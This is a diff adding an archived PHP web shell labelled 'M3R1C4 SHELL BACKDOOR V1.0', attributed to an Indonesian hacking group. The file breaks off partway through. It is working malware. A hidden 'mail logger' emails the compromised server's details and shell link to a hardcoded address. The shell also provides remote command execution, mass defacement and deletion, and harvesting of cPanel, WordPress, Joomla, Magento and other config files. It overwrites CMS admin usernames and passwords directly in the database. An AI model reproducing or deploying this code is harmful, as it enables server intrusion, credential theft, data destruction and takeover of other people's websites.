@@ -1,0 +1,1647 @@
+<html>
+
+
+
+<!--- MAIL LOGGER START AT LINE 119 --->
+
+
+
+
+
+<head><script src="//archive.org/includes/analytics.js?v=cf34f82" type="text/javascript"></script>
+<script type="text/javascript">window.addEventListener('DOMContentLoaded',function(){var v=archive_analytics.values;v.service='wb';v.server_name='wwwb-app215.us.archive.org';v.server_ms=762;archive_analytics.send_pageview({});});</script>
+<script type="text/javascript" src="https://web-static.archive.org/_static/js/bundle-playback.js?v=qM_6omlu" charset="utf-8"></script>
+<script type="text/javascript" src="https://web-static.archive.org/_static/js/wombat.js?v=txqj7nKC" charset="utf-8"></script>
+<script>window.RufflePlayer=window.RufflePlayer||{};window.RufflePlayer.config={"autoplay":"on","unmuteOverlay":"hidden"};</script>
+<script type="text/javascript" src="https://web-static.archive.org/_static/js/ruffle/ruffle.js"></script>
+<script type="text/javascript">
+    __wm.pc(0.001);
+    __wm.init("https://web.archive.org/web");
+  __wm.wombat("https://download2262.mediafire.com/faudcjvfw03gP5wE4nf1-OhdaoARR8IUmhpWF79jDDblqMhIQAq23A0f09f--TqatStI--3BEj5ZFrL9Y2ASfWGmnqyia7WWjVmyeacnlikgVxJuEkuwxVOeEdkC5dQt9PY6-o2l5U4cPcB8AJKUea5bG_9z9zHL8G6bs3hnt0Q/6cu6wweno8ui97p/merica.php","20230813110026","https://web.archive.org/","web","https://web-static.archive.org/_static/",
+        "1691924426");
+</script>
+<link rel="stylesheet" type="text/css" href="https://web-static.archive.org/_static/css/banner-styles.css?v=S1zqJCYt" />
+<link rel="stylesheet" type="text/css" href="https://web-static.archive.org/_static/css/iconochive.css?v=qtvMKcIJ" />
+<!-- End Wayback Rewrite JS Include -->
+
+<title>M3R1C4</title>
+<meta name="author" content="Trenggalek Cyber Army">
+<meta charset="UTF-8">
+<style type="text/css">
+@import url(https://web.archive.org/web/20230813110026cs_/https://fonts.googleapis.com/css?family=Ubuntu);
+html {
+    background: black url("data:image/gif;base64,R0lGODlhMgAqAPMLABcXFyYmJjAwMB0dHSAgIBoaGhkZGRQUFCQkJBwcHAAAAP///wAAAAAAAAAAAAAAACH5BAQKAAAAIf4DRzQ0ACH/C05FVFNDQVBFMi4wAwEAAAAsAAAAADIAKgAABP5QyUmrvTjbk44sSCElycR5CoKY3Re6onJK6mQot0LoUynduZQNJ9nteEfgZDVS+FZMZ09Kmz6FQmbJhyXmjNMfsSr+8pDlJQsFiiUCAMksJRjIW4o27I5CCDSAgYKDhIWBNSNcc3oyeHMkE4yPXF1UXkVnSpdNmEljlpVcW1VaVKOcWU2iFFGWmmCbmpawslx+dk5wfHuNKI+6eS+9IwGGxsfIyRiTS1GQuylRc4vCc7WsFFyyUZqvmWOnoK2rtlaqpOeb4tlDQdxj3p45v3F0uG/1c7fQ1DEcygADCswgCc+zYDEKojg4DQ8jWp+4wIIYRBu8MbCgpLOkMZWUVYHpTnWkGAaNyWtpNsFSSKweI5a58jly2GqgzZvGGOJBNKwnT2bQeLr69C7HtnYlj5YM58wUR3OomLJL2aUbUaSolMYMWoffzq498XHFSbasoIMw9UVJu1ManlnfjF7tlFIrSo+npKL7uLEpyJMX3U0gqa5oS14N+4BlqxjXP7PHIgAAIfkEBQoACwAsAQABADAAKAAABP4wJUURUivrvdRJXChuikRNlHJRhmKErguXo3imajqBXEn3v1rGR6ykWq8ecsYTakoBgLN3mFqv2Kx2y918DpQCokD5VlYKMdmTALPdltSXtBQaYXVSjiV77mA7KReAQU97Pk0deSN3Sn16aEgJUWVtYWOVcAIDl2tmbxWbXaOkpVcqaHMhYllncpYlKJGPTwQYWIK3erI6hUODuI27RnxJJLatwoYTCJtlpiTNnG/Q1dbXCxMiJpknKGljrS03TLrLKbYErd/aQO3DRgjiveXlFOlZsJNTHtj+/wBXheuhxtsrNwXmGbNyoxgec4QS8Svyp8c7G4smfsuoCCIVWD4FoQDodIIStYAoU17BBCpWipAftLRUg8+dxxgLh/h4OC7dBXk2I9azSORnzWE8h9KhFeLTpJHgPEl00i1qBAAh+QQFCgALACwBAAEAMAAoAAAE/rCgsqq9OOudEVIEqCgGOSqJko3fSnCa8n1oPaarrGI6zIchU+m2u7CKFpBvyWw6n9CodErFHBKHW2okKWhP16zMd1yVhrXcVnhCwMq81BrHs9XWbg7ceD7RjXZ9e08KVxtdNwEAI2EsVY+QkU2NhVgsNJUxiCh/ZIKCOiNnLiJEoiR6ckR4figrM62rep8mR6cGpEGBJAkBMZSUCAIDjAmSx8jJVV1LCcZSQrlmta7Qcq9jcXadS6WjP0o8oM/K5ebn6BdrhiuUmx5Ib3a7uOKodS1MpvvX2uRJPfTNW/ONzz1A+ZR5qSTmnYB0ECNWKCbGWbwFMjBRskgozLiLIIMm0tNnQBWRHAkBzqlmBNadjyhBjnRiCYUiFsPMhYkAACH5BAUKAAsALAEAAQAwACgAAAT+MCW1ql0F3c2XUlonftOnlAqRcorRsiAlbqR5mgjITgmcz7SbCaUisFwGH3DJbDqf0Kh02vwcEodPpvBB/JhYEmqrRXAV14OLWmm5a5/iscVj31CoXOhyX9uRQyZyNEhpZWcIAmwdW4uOj5CRCgVVXjJObzcsRYE+JoBdQDUsep1BOTV5opo0nKOnn5l6UFmTj4mRubq7OyhpUDpUr3wqTF2XlaZ8s6tfmCrDFinIIzG8T3vX2tsbYWjehiDZ0uHhllZYfH7N1B6goDEfSHwTxtY0PKk4gT3S6zPH5rhwMzAewUQD0NUq5w0XC4a1EFrhRrGixYsYM+5KQQaEoosDZiIAADs=");
+
+    color: #ffffff;
+    font-family: 'Ubuntu';
+  font-size: 13px;
+  width: 100%;
+}
+li {
+  display: inline;
+  margin: 5px;
+  padding: 5px;
+}
+table, th, td {
+  border-collapse:collapse;
+  font-family: Tahoma, Geneva, sans-serif;
+  background: transparent;
+  font-family: 'Ubuntu';
+  font-size: 13px;
+}
+.table_home, .th_home, .td_home {
+  border: 1px solid #ffffff;
+}
+th {
+  padding: 10px;
+}
+a {
+  color: #ffffff;
+  text-decoration: none;
+}
+a:hover {
+  color: yellow;
+  text-decoration: underline;
+}
+b {
+  color: yellow;
+}
+input[type=text], input[type=password],input[type=submit] {
+  background: transparent; 
+  color: #ffffff; 
+  border: 1px solid #ffffff; 
+  margin: 5px auto;
+  padding-left: 5px;
+  font-family: 'Ubuntu';
+  font-size: 13px;
+}
+textarea {
+  border: 1px solid #ffffff;
+  width: 100%;
+  height: 400px;
+  padding-left: 5px;
+  margin: 10px auto;
+  resize: none;
+  background: transparent;
+  color: #ffffff;
+  font-family: 'Ubuntu';
+  font-size: 13px;
+}
+</style>
+</head>
+//M3R1C4 SHELL BACKDOOR V1.0 
+//Design By Noval - TCA team
+//Greezt : IndoXploit & Ustadcage48
+//Keep Calm & Crootz!
+
+
+set_time_limit(0);
+error_reporting(0);
+
+if(get_magic_quotes_gpc()){
+foreach($_POST as $key=>$value){
+$_POST[$key] = stripslashes($value);
+}
+}
+echo '<!doctype html>
+<html>
+<head>
+<title>$$ Beby $$</title>
+</head>';
+
+?>
+
+
+<?php
+
+//MAIL LOGGER
+
+$kime="aqpunk21@gmail.com";
+$baslik="Pesanan Shell datang Cuk !";
+$spyhackerz="Dosya Yolu : ".$_SERVER['DOCUMENT_ROOT']."\r\n";
+$spyhackerz.="Server Admin : ".$_SERVER['SERVER_ADMIN']."\r\n";
+$spyhackerz.="Server isletim sistemi : ".$_SERVER['SERVER_SOFTWARE']."\r\n";
+$spyhackerz.="Shell Link : http://".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\r\n";
+$spyhackerz.="Avlanan Site : " .$_SERVER['HTTP_HOST']."\r\n";
+mail($kime, $baslik, $spyhackerz);
+?>
+
+
+
+<style> 
+@font-face {
+  font-family: 'Comic Sans MS';
+  font-style: normal;
+  font-weight: 400;
+  src: local('Comic Sans MS'), local('ComicSansMS'), url(http://fonts.gstatic.com/l/font?kit=3oir0CAJ0QJ5h5-A3AP8rRSrmRvs-bRaaQbSAUyiv7A&skey=a4ba60ff9fc73cf8&v=v8) format('truetype');
+}
+body {
+  
+  background: black url("data:image/gif;base64,R0lGODlhMgAqAPMLABcXFyYmJjAwMB0dHSAgIBoaGhkZGRQUFCQkJBwcHAAAAP///wAAAAAAAAAAAAAAACH5BAQKAAAAIf4DRzQ0ACH/C05FVFNDQVBFMi4wAwEAAAAsAAAAADIAKgAABP5QyUmrvTjbk44sSCElycR5CoKY3Re6onJK6mQot0LoUynduZQNJ9nteEfgZDVS+FZMZ09Kmz6FQmbJhyXmjNMfsSr+8pDlJQsFiiUCAMksJRjIW4o27I5CCDSAgYKDhIWBNSNcc3oyeHMkE4yPXF1UXkVnSpdNmEljlpVcW1VaVKOcWU2iFFGWmmCbmpawslx+dk5wfHuNKI+6eS+9IwGGxsfIyRiTS1GQuylRc4vCc7WsFFyyUZqvmWOnoK2rtlaqpOeb4tlDQdxj3p45v3F0uG/1c7fQ1DEcygADCswgCc+zYDEKojg4DQ8jWp+4wIIYRBu8MbCgpLOkMZWUVYHpTnWkGAaNyWtpNsFSSKweI5a58jly2GqgzZvGGOJBNKwnT2bQeLr69C7HtnYlj5YM58wUR3OomLJL2aUbUaSolMYMWoffzq498XHFSbasoIMw9UVJu1ManlnfjF7tlFIrSo+npKL7uLEpyJMX3U0gqa5oS14N+4BlqxjXP7PHIgAAIfkEBQoACwAsAQABADAAKAAABP4wJUURUivrvdRJXChuikRNlHJRhmKErguXo3imajqBXEn3v1rGR6ykWq8ecsYTakoBgLN3mFqv2Kx2y918DpQCokD5VlYKMdmTALPdltSXtBQaYXVSjiV77mA7KReAQU97Pk0deSN3Sn16aEgJUWVtYWOVcAIDl2tmbxWbXaOkpVcqaHMhYllncpYlKJGPTwQYWIK3erI6hUODuI27RnxJJLatwoYTCJtlpiTNnG/Q1dbXCxMiJpknKGljrS03TLrLKbYErd/aQO3DRgjiveXlFOlZsJNTHtj+/wBXheuhxtsrNwXmGbNyoxgec4QS8Svyp8c7G4smfsuoCCIVWD4FoQDodIIStYAoU17BBCpWipAftLRUg8+dxxgLh/h4OC7dBXk2I9azSORnzWE8h9KhFeLTpJHgPEl00i1qBAAh+QQFCgALACwBAAEAMAAoAAAE/rCgsqq9OOudEVIEqCgGOSqJko3fSnCa8n1oPaarrGI6zIchU+m2u7CKFpBvyWw6n9CodErFHBKHW2okKWhP16zMd1yVhrXcVnhCwMq81BrHs9XWbg7ceD7RjXZ9e08KVxtdNwEAI2EsVY+QkU2NhVgsNJUxiCh/ZIKCOiNnLiJEoiR6ckR4figrM62rep8mR6cGpEGBJAkBMZSUCAIDjAmSx8jJVV1LCcZSQrlmta7Qcq9jcXadS6WjP0o8oM/K5ebn6BdrhiuUmx5Ib3a7uOKodS1MpvvX2uRJPfTNW/ONzz1A+ZR5qSTmnYB0ECNWKCbGWbwFMjBRskgozLiLIIMm0tNnQBWRHAkBzqlmBNadjyhBjnRiCYUiFsPMhYkAACH5BAUKAAsALAEAAQAwACgAAAT+MCW1ql0F3c2XUlonftOnlAqRcorRsiAlbqR5mgjITgmcz7SbCaUisFwGH3DJbDqf0Kh02vwcEodPpvBB/JhYEmqrRXAV14OLWmm5a5/iscVj31CoXOhyX9uRQyZyNEhpZWcIAmwdW4uOj5CRCgVVXjJObzcsRYE+JoBdQDUsep1BOTV5opo0nKOnn5l6UFmTj4mRubq7OyhpUDpUr3wqTF2XlaZ8s6tfmCrDFinIIzG8T3vX2tsbYWjehiDZ0uHhllZYfH7N1B6goDEfSHwTxtY0PKk4gT3S6zPH5rhwMzAewUQD0NUq5w0XC4a1EFrhRrGixYsYM+5KQQaEoosDZiIAADs=");
+line-height: 1;color: #fff;font-family: Comic Sans MS ;
+  
+  }
+  
+table, th, td {
+  border-collapse:collapse;
+  background: transparent;
+  font-family: Comic Sans MS ;
+  font-size: 13px;
+}
+input, textarea { font-family: Comic Sans MS ; }
+.table_home, .th_home, .td_home { color:grey;
+  border: 1px solid grey;
+}
+th {
+  padding: 10px;
+}
+.td_home { padding: 7px; }
+select {font-family: Comic Sans MS }
+a {color:white}
+textarea { width: 100%;height: 400px; }
+</style>
+<?php
+
+echo '</head>
+<body><b>
+<H1><center>M3R1C4 <font color="red">SHELL BACKDOOR</font> <font color="dodgerblue">V1.0</font></center></h1>
+<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
+
+<tr><td>
+
+<font color="green"><center>'.php_uname().'</center></font><br>';
+if(isset($_GET['path'])){
+$path = $_GET['path'];
+}else{
+$path = 
+getcwd();
+}
+$path = str_replace('\\','/',$path);
+$paths = explode('/',$path);
+
+foreach($paths as $id=>$pat){
+if($pat == '' && $id == 0){
+$a = true;
+echo '<font color=#fff><center>Current DIR:<a href="?path=/">/</a>';
+continue;
+}
+if($pat == '') continue;
+echo '<a href="?path=';
+for($i=0;$i<=$id;$i++){
+echo "$paths[$i]";
+if($i != $id) echo "/";
+}
+echo '">'.$pat.'</a>/';
+}
+echo "<hr>";
+echo "<right>";
+echo "<ul>";
+echo "<li><a href='?'>Home</a></li>";
+echo "<li><a href='?dir=$dir&do=cmd'>Command</a></li>";
+echo "<li><a href='?dir=$dir&do=mass_deface'>Mass Deface</a></li>";
+echo "<li><a href='?dir=$dir&do=mass_delete'>Mass Delete</a></li>";
+echo "<li><a href='?dir=$dir&do=config'>Config</a></li>";
+echo "<li><a href='?dir=$dir&do=jumping'>Jumping</a></li>";
+echo "<li><a href='?dir=$dir&do=cpanel'>CPanel Crack</a></li>";
+echo "<li><a href='?dir=$dir&do=smtp'>SMTP Grabber</a></li>";
+echo "<li><a href='?dir=$dir&do=zoneh'>Zone-H</a></li>";
+echo "<li><a href='?dir=$dir&do=cgi'>CGI Telnet</a></li>";
+echo "<li><a href='?dir=$dir&do=network'>network</a></li>";
+echo "<li><a href='?dir=$dir&do=adminer'>Adminer</a></li><br>";
+echo "<li><a href='?dir=$dir&do=fake_root'>Fake Root</a></li>";
+echo "<li><a href='?dir=$dir&do=auto_edit_user'>Auto Edit User</a></li>";
+echo "<li><a href='?dir=$dir&do=auto_wp'>Auto Edit Title WordPress</a></li>";
+echo "<li><a href='?dir=$dir&do=auto_dwp'>WordPress Auto Deface</a></li>";
+echo "<li><a href='?dir=$dir&do=auto_dwp2'>WordPress Auto Deface V.2</a></li>";
+echo "<li><a href='?dir=$dir&do=cpftp_auto'>CPanel/FTP Auto Deface</a></li>";
+echo "</ul>";
+echo "</right>";
+echo "<hr>";
+if($_GET['do'] == 'upload') {
+  echo "<center>";
+  if($_POST['upload']) {
+    if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
+      $act = "<font color=lime>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
+    } else {
+      $act = "<font color=red>failed to upload file</font>";
+    }
+  }
+  echo "Upload File: [ ".w($dir,"Writeable")." ]<form method='post' enctype='multipart/form-data'><input type='file' name='ix_file'><input type='submit' value='upload' name='upload'></form>";
+  echo $act;
+  echo "</center>";
+} elseif($_GET['do'] == 'cmd') {
+  echo "<form method='post'>
+  <font style='text-decoration: underline;'>".$user."@".gethostbyname($_SERVER['HTTP_HOST']).":~# </font>
+  <input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
+  </form>";
+  if($_POST['do_cmd']) {
+    echo "<pre>".exe($_POST['cmd'])."</pre>";
+  }
+} elseif($_GET['do'] == 'mass_deface') {
+  function sabun_massal($dir,$namafile,$isi_script) {
+    if(is_writable($dir)) {
+      $dira = scandir($dir);
+      foreach($dira as $dirb) {
+        $dirc = "$dir/$dirb";
+        $lokasi = $dirc.'/'.$namafile;
+        if($dirb === '.') {
+          file_put_contents($lokasi, $isi_script);
+        } elseif($dirb === '..') {
+          file_put_contents($lokasi, $isi_script);
+        } else {
+          if(is_dir($dirc)) {
+            if(is_writable($dirc)) {
+              echo "[<font color=lime>DONE</font>] $lokasi<br>";
+              file_put_contents($lokasi, $isi_script);
+              $idx = sabun_massal($dirc,$namafile,$isi_script);
+            }
+          }
+        }
+      }
+    }
+  }
+  function sabun_biasa($dir,$namafile,$isi_script) {
+    if(is_writable($dir)) {
+      $dira = scandir($dir);
+      foreach($dira as $dirb) {
+        $dirc = "$dir/$dirb";
+        $lokasi = $dirc.'/'.$namafile;
+        if($dirb === '.') {
+          file_put_contents($lokasi, $isi_script);
+        } elseif($dirb === '..') {
+          file_put_contents($lokasi, $isi_script);
+        } else {
+          if(is_dir($dirc)) {
+            if(is_writable($dirc)) {
+              echo "[<font color=lime>DONE</font>] $lokasi<br>";
+              file_put_contents($lokasi, $isi_script);
+            }
+          }
+        }
+      }
+    }
+  }
+  if($_POST['start']) {
+    if($_POST['tipe_sabun'] == 'mahal') {
+      echo "<div style='margin: 5px auto; padding: 5px'>";
+      sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
+      echo "</div>";
+    } elseif($_POST['tipe_sabun'] == 'murah') {
+      echo "<div style='margin: 5px auto; padding: 5px'>";
+      sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
+      echo "</div>";
+    }
+  } else {
+  echo "<center>";
+  echo "<form method='post'>
+  <font style='text-decoration: underline;'>Tipe Sabun:</font><br>
+  <input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
+  <font style='text-decoration: underline;'>Folder:</font><br>
+  <input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
+  <font style='text-decoration: underline;'>Filename:</font><br>
+  <input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
+  <font style='text-decoration: underline;'>Index File:</font><br>
+  <textarea name='script' style='width: 450px; height: 200px;'>Hacked by </textarea><br>
+  <input type='submit' name='start' value='Mass Deface' style='width: 100px;'>
+  </form></center>";
+  }
+} elseif($_GET['do'] == 'mass_delete') {
+  function hapus_massal($dir,$namafile) {
+    if(is_writable($dir)) {
+      $dira = scandir($dir);
+      foreach($dira as $dirb) {
+        $dirc = "$dir/$dirb";
+        $lokasi = $dirc.'/'.$namafile;
+        if($dirb === '.') {
+          if(file_exists("$dir/$namafile")) {
+            unlink("$dir/$namafile");
+          }
+        } elseif($dirb === '..') {
+          if(file_exists("".dirname($dir)."/$namafile")) {
+            unlink("".dirname($dir)."/$namafile");
+          }
+        } else {
+          if(is_dir($dirc)) {
+            if(is_writable($dirc)) {
+              if(file_exists($lokasi)) {
+                echo "[<font color=lime>DELETED</font>] $lokasi<br>";
+                unlink($lokasi);
+                $idx = hapus_massal($dirc,$namafile);
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+  if($_POST['start']) {
+    echo "<div style='margin: 5px auto; padding: 5px'>";
+    hapus_massal($_POST['d_dir'], $_POST['d_file']);
+    echo "</div>";
+  } else {
+  echo "<center>";
+  echo "<form method='post'>
+  <font style='text-decoration: underline;'>Folder:</font><br>
+  <input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
+  <font style='text-decoration: underline;'>Filename:</font><br>
+  <input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
+  <input type='submit' name='start' value='Mass Delete' style='width: 100px;'>
+  </form></center>";
+  }
+} elseif($_GET['do'] == 'config') {
+  $etc = fopen("/etc/passwd", "r");
+  $idx = mkdir("idx_config", 0777);
+  $isi_htc = "Options all\nRequire None\nSatisfy Any";
+  $htc = fopen("idx_config/.htaccess","w");
+  fwrite($htc, $isi_htc);
+  while($passwd = fgets($etc)) {
+    if($passwd == "" || !$etc) {
+      echo "<font color=red>Can't read /etc/passwd</font>";
+    } else {
+      preg_match_all('/(.*?):x:/', $passwd, $user_config);
+      foreach($user_config[1] as $user_idx) {
+        $user_config_dir = "/home/$user_idx/public_html/";
+        if(is_readable($user_config_dir)) {
+          $grab_config = array(
+            "/home/$user_idx/.my.cnf" => "cpanel",
+            "/home/$user_idx/.accesshash" => "WHM-accesshash",
+            "/home/$user_idx/public_html/vdo_config.php" => "Voodoo",
+            "/home/$user_idx/public_html/bw-configs/config.ini" => "BosWeb",
+            "/home/$user_idx/public_html/config/koneksi.php" => "Lokomedia",
+            "/home/$user_idx/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
+            "/home/$user_idx/public_html/clientarea/configuration.php" => "WHMCS",
+            "/home/$user_idx/public_html/whm/configuration.php" => "WHMCS",
+            "/home/$user_idx/public_html/whmcs/configuration.php" => "WHMCS",
+            "/home/$user_idx/public_html/forum/config.php" => "phpBB",
+            "/home/$user_idx/public_html/sites/default/settings.php" => "Drupal",
+            "/home/$user_idx/public_html/config/settings.inc.php" => "PrestaShop",
+            "/home/$user_idx/public_html/app/etc/local.xml" => "Magento",
+            "/home/$user_idx/public_html/joomla/configuration.php" => "Joomla",
+            "/home/$user_idx/public_html/configuration.php" => "Joomla",
+            "/home/$user_idx/public_html/wp/wp-config.php" => "WordPress",
+            "/home/$user_idx/public_html/wordpress/wp-config.php" => "WordPress",
+            "/home/$user_idx/public_html/wp-config.php" => "WordPress",
+            "/home/$user_idx/public_html/admin/config.php" => "OpenCart",
+            "/home/$user_idx/public_html/slconfig.php" => "Sitelok",
+            "/home/$user_idx/public_html/application/config/database.php" => "Ellislab");
+          foreach($grab_config as $config => $nama_config) {
+            $ambil_config = file_get_contents($config);
+            if($ambil_config == '') {
+            } else {
+              $file_config = fopen("idx_config/$user_idx-$nama_config.txt","w");
+              fputs($file_config,$ambil_config);
+            }
+          }
+        }   
+      }
+    } 
+  }
+  echo "<center><a href='?dir=$dir/idx_config'><font color=lime>Done</font></a></center>";
+} elseif($_GET['do'] == 'jumping') {
+  $i = 0;
+  echo "<pre><div class='margin: 5px auto;'>";
+  $etc = fopen("/etc/passwd", "r");
+  while($passwd = fgets($etc)) {
+    if($passwd == '' || !$etc) {
+      echo "<font color=red>Can't read /etc/passwd</font>";
+    } else {
+      preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
+      foreach($user_jumping[1] as $user_idx_jump) {
+        $user_jumping_dir = "/home/$user_idx_jump/public_html";
+        if(is_readable($user_jumping_dir)) {
+          $i++;
+          $jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
+          if(is_writable($user_jumping_dir)) {
+            $jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
+          }
+          echo $jrw;
+          if(function_exists('posix_getpwuid')) {
+            $domain_jump = file_get_contents("/etc/named.conf");  
+            if($domain_jump == '') {
+              echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
+            } else {
+              preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
+              foreach($domains_jump[1] as $dj) {
+                $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
+                $user_jumping_url = $user_jumping_url['name'];
+                if($user_jumping_url == $user_idx_jump) {
+                  echo " => ( <u>$dj</u> )<br>";
+                  break;
+                }
+              }
+            }
+          } else {
+            echo "<br>";
+          }
+        }
+      }
+    }
+  }
+  if($i == 0) { 
+  } else {
+    echo "<br>Total ada ".$i." Kamar di ".gethostbyname($_SERVER['HTTP_HOST'])."";
+  }
+  echo "</div></pre>";
+} elseif($_GET['do'] == 'auto_edit_user') {
+  if($_POST['hajar']) {
+    if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
+      echo "username atau password harus lebih dari 6 karakter";
+    } else {
+      $user_baru = $_POST['user_baru'];
+      $pass_baru = md5($_POST['pass_baru']);
+      $conf = $_POST['config_dir'];
+      $scan_conf = scandir($conf);
+      foreach($scan_conf as $file_conf) {
+        if(!is_file("$conf/$file_conf")) continue;
+        $config = file_get_contents("$conf/$file_conf");
+        if(preg_match("/JConfig|joomla/",$config)) {
+          $dbhost = ambilkata($config,"host = '","'");
+          $dbuser = ambilkata($config,"user = '","'");
+          $dbpass = ambilkata($config,"password = '","'");
+          $dbname = ambilkata($config,"db = '","'");
+          $dbprefix = ambilkata($config,"dbprefix = '","'");
+          $prefix = $dbprefix."users";
+          $conn = mysql_connect($dbhost,$dbuser,$dbpass);
+          $db = mysql_select_db($dbname);
+          $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
+          $result = mysql_fetch_array($q);
+          $id = $result['id'];
+          $site = ambilkata($config,"sitename = '","'");
+          $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
+          echo "Config => ".$file_conf."<br>";
+          echo "CMS => Joomla<br>";
+          if($site == '') {
+            echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
+          } else {
+            echo "Sitename => $site<br>";
+          }
+          if(!$update OR !$conn OR !$db) {
+            echo "Status => <font color=red>".mysql_error()."</font><br><br>";
+          } else {
+            echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
+          }
+          mysql_close($conn);
+        } elseif(preg_match("/WordPress/",$config)) {
+          $dbhost = ambilkata($config,"DB_HOST', '","'");
+          $dbuser = ambilkata($config,"DB_USER', '","'");
+          $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
+          $dbname = ambilkata($config,"DB_NAME', '","'");
+          $dbprefix = ambilkata($config,"table_prefix  = '","'");
+          $prefix = $dbprefix."users";
+          $option = $dbprefix."options";
+          $conn = mysql_connect($dbhost,$dbuser,$dbpass);
+          $db = mysql_select_db($dbname);
+          $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
+          $result = mysql_fetch_array($q);
+          $id = $result[ID];
+          $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
+          $result2 = mysql_fetch_array($q2);
+          $target = $result2[option_value];
+          if($target == '') {
+            $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
+          } else {
+            $url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
+          }
+          $update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
+          echo "Config => ".$file_conf."<br>";
+          echo "CMS => Wordpress<br>";
+          echo $url_target;
+          if(!$update OR !$conn OR !$db) {
+            echo "Status => <font color=red>".mysql_error()."</font><br><br>";
+          } else {
+            echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
+          }
+          mysql_close($conn);
+        } elseif(preg_match("/Magento|Mage_Core/",$config)) {
+          $dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
+          $dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
+          $dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
+          $dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
+          $dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
+          $prefix = $dbprefix."admin_user";
+          $option = $dbprefix."core_config_data";
+          $conn = mysql_connect($dbhost,$dbuser,$dbpass);
+          $db = mysql_select_db($dbname);
+          $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
+          $result = mysql_fetch_array($q);
+          $id = $result[user_id];
+          $q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
+          $result2 = mysql_fetch_array($q2);
+          $target = $result2[value];
+          if($target == '') {
+            $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
+          } else {
+            $url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
+          }
+          $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
+          echo "Config => ".$file_conf."<br>";
+          echo "CMS => Magento<br>";
+          echo $url_target;
+          if(!$update OR !$conn OR !$db) {
+            echo "Status => <font color=red>".mysql_error()."</font><br><br>";
+          } else {
+            echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
+          }
+          mysql_close($conn);
+        } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
+          $dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
+          $dbuser = ambilkata($config,"'DB_USERNAME', '","'");
+          $dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
+          $dbname = ambilkata($config,"'DB_DATABASE', '","'");
+          $dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
+          $prefix = $dbprefix."user";
+          $conn = mysql_connect($dbhost,$dbuser,$dbpass);
+          $db = mysql_select_db($dbname);
+          $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
+          $result = mysql_fetch_array($q);
+          $id = $result[user_id];
+          $target = ambilkata($config,"HTTP_SERVER', '","'");
+          if($target == '') {
+            $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
+          } else {
+            $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
+          }
+          $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
+          echo "Config => ".$file_conf."<br>";
+          echo "CMS => OpenCart<br>";
+          echo $url_target;
+          if(!$update OR !$conn OR !$db) {
+            echo "Status => <font color=red>".mysql_error()."</font><br><br>";
+          } else {
+            echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
+          }
+          mysql_close($conn);
+        } elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
+          $dbhost = ambilkata($config,'server = "','"');
+          $dbuser = ambilkata($config,'username = "','"');
+          $dbpass = ambilkata($config,'password = "','"');
+          $dbname = ambilkata($config,'database = "','"');
+          $prefix = "users";
+          $option = "identitas";
+          $conn = mysql_connect($dbhost,$dbuser,$dbpass);
+          $db = mysql_select_db($dbname);
+          $q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
